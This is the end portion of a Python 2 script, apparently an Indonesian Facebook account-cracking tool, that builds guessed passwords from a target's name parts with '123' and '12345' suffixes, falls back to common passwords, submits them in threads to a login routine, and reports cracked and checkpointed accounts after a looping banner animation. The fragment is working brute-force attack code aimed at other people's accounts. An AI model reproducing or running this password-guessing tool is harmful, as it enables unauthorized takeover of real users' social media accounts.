                        		xz[1]+'123', xz[1]+'12345',
                        		xz[2]+'123', xz[2]+'12345',
                        	]
                        elif len(xz) == 4:
                        	raimuuu = [
                        		xz[0], xz[0]+'123', xz[0]+'12345',
                        		xz[1]+'123', xz[1]+'12345',
                        		xz[2]+'123', xz[2]+'12345',
                        		xz[3]+'123', xz[3]+'12345',
                        	]
                        else:
                        	raimuuu = [
                        		'sayang', 'anjing',
                        		'bismillah', '123456'
                        	]
                        __yayanXD__.submit(self.__mfb__, bb[0], raimuuu)
                    except:
                        pass

            print '\n\n %s[%s#%s]Crack Done !!!'%(N,K,N)
#            print '\n\n %s[%s#%s] crack selesai...'%(N,K,N)
            os.remove(self.apk)
            hasil(ok,cp)
            exit()
            
if __name__ == '__main__':
    os.system('echo "Yah Kang Recoder Lewat?? Ciee Kntl" >> risky.txt;git pull;clear')
    os.system('clear')
    jalan(c+"Tunggu Sebentar !!");time.sleep(1)
    os.system('clear')
    print("\r"+ris);time.sleep(0.3)
    os.system('clear')
    print("\r"+ris2);time.sleep(0.3)
    os.system('clear')
    print("\r"+ris);time.sleep(0.3)
    os.system('clear')
    print("\r"+ris2);time.sleep(0.3)
    os.system('clear')
    print("\r"+ris3);time.sleep(0.3)
    os.system('clear')
    print("\r"+ris);time.sleep(0.3)
    os.system('clear')
    print("\r"+ris2);time.sleep(0.3)
    os.system('clear')
    print("\r"+ris3);time.sleep(0.3)
    os.system('clear')
    print("\r"+ris);time.sleep(0.3)
    os.system('clear')
    print("\r"+ris2);time.sleep(0.3)
    os.system('clear')
    print("\r"+ris);time.sleep(0.3)
    os.system('clear')
    print("\r"+ris2);time.sleep(0.3)
    os.system('clear')
    print("\r"+ris3);time.sleep(0.3)
    os.system('clear')
    print("\r"+ris);time.sleep(0.3)
    os.system('clear')
    print("\r"+ris2);time.sleep(0.3)
    os.system('clear')
    print("\r"+ris3);time.sleep(0.3)
    __cek__()
    moch_yayan()

